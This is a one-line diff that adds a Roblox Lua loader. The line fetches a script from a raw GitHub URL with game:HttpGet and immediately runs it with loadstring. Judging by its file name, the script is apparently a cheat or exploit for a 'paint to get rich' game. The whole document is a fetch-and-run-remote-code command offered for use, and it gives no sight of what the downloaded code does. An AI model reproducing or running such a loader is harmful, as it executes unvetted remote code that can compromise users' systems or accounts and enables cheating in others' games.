@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Unitetrumake/loaders/main/loaders/upd-paint-to-get-rich-spam2-i2jl63lcgqkre9.lua"))()
